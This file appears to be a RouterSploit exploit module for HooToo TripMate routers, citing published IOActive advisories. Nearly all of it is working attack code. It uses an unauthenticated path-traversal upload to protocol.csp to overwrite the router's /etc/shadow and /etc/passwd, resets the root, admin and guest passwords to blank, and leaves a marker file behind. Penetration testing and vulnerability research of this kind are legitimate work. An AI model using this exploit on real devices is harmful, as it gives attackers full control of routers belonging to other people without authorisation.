from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    http_request,
    validators,
    random_text,
    mute,
)


class Exploit(exploits.Exploit):

    """Exploit implementation for unauthenticated arbitrary file upload in protocol.csp on HooToo TripMate routers."""

    __info__ = {
        'name': 'HooToo TripMate unauthenticated protocol.csp arbitrary file upload',
        'authors': [
            'Tao "depierre" Sauvage',
        ],
        'description': 'Module exploits TripMate unauthenticated arbitrary file upload in protocol.csp, '
                       'to reset root, admin and guest passwords to blank, by overriding /etc/shadow and /etc/passwd '
                       'on the router.',
        'references': [
            'http://blog.ioactive.com/2018/04/hootoo-tripmate-routers-are-cute-but.html',
            'https://www.ioactive.com/pdfs/HooToo_Security_Advisory_FINAL_4.19.18.pdf'
        ],
        'devices': [
            'HooToo TripMate HT-TM01, firmware fw-WiFiDGRJ-HooToo-TM01-2.000.046',
            'HooToo TripMate Nano HT-TM02, firmware fw-WiFiPort-HooToo-TM02-2.000.072',
            'HooToo TripMate Mini HT-TM03, firmware fw-WiFiSDRJ-HooToo-TM03-2.000.016',
            'HooToo TripMate Elite HT-TM04, firmware fw-WiFiDGRJ2-HooToo-TM04-2.000.008',
            'HooToo TripMate Titan HT-TM05, firmware fw-7620-WiFiDGRJ-HooToo-HT-TM05-2.000.080.080',
            'HooToo TripMate Elite U HT-TM06, firmware fw-7620-WiFiDGRJ-HooToo-633-HT-TM06-2.000.048',
        ],
    }

    target = exploits.Option('', 'Target address running ioos, e.g. http://10.10.10.254', validators=validators.url)
    port = exploits.Option(81, 'Target port running ioos')

    def run(self):
        if self.check():
            print_success('Target is vulnerable')
            print_status('Overriding /etc/shadow')
            url = u'{}:{}/protocol.csp'.format(self.target, self.port)
            new_shadow = 'root:$1$QlrmwRgO$c0iSI2euV.U1Wx6yBkDBI.:15386:0:99999:7:::\n'
            new_shadow += 'admin:$1$QlrmwRgO$c0iSI2euV.U1Wx6yBkDBI.:13341:0:99999:7:::\n'
            http_request(method=u'POST', url=url, files={'name': ('../etc/shadow', new_shadow)})
            print_status('Overriding /etc/passwd')
            new_passwd = 'root:$1$QlrmwRgO$c0iSI2euV.U1Wx6yBkDBI.:0:0:root:/root:/bin/sh\n'
            new_passwd += 'bin:x:1:1:bin:/bin:/sbin/nologin\n'
            new_passwd += 'daemon:x:2:2:daemon:/sbin:/sbin/nologin\n'
            new_passwd += 'admin:$1$QlrmwRgO$c0iSI2euV.U1Wx6yBkDBI.:15:0:admin:/data/UsbDisk1/Volume1:/bin/sh\n'
            new_passwd += 'mail:*:8:8:mail:/var/mail:/bin/sh\n'
            new_passwd += 'nobody:x:65534:65534:Nobody:/data/UsbDisk1/Volume1:/bin/sh\n'
            new_passwd += 'guest:$1$QlrmwRgO$c0iSI2euV.U1Wx6yBkDBI.:512:0:guest:/data/UsbDisk1/Volume1/Share:/bin/sh-new\n'
            http_request(method=u'POST', url=url, files={'name': ('../etc/passwd', new_passwd)})
            print_status('Verifying new password')
            response = http_request(
                method=u'GET', url=url,
                params={'function': 'set', 'fname': 'security', 'opt': 'pwdchk', 'name': 'admin', 'pwd1': ''})
            if not response or '<errno>0</errno>' not in response.text:
                print_error('Password could not be updated successfully!')
            else:
                print_success('All passwords have been successfully updated to blank!')
        else:
            print_error('Target is not vulnerable')

    @mute
    def check(self):
        url = u'{}:{}/protocol.csp'.format(self.target, self.port)
        # 1. Create a file in the /www/firwmare/ directory (writeable).
        marker = random_text(64)
        filename = '/www/firmware/{}'.format(marker)
        response = http_request(method=u'POST', url=url, files={'name': ('../{}'.format(filename), marker)})
        if not response:
            return False
        # 2. Check that the file was successfully created>
        url_marker = u'{}:{}/firmware/{}'.format(self.target, self.port, marker)
        response = http_request(method=u'GET', url=url_marker)
        if not response or not response.status_code == 200 or marker not in response.text:
            return False
        # 3. Clean up the temp file. Not possible with this vuln though, so leaving the marker file on the router.
        return True
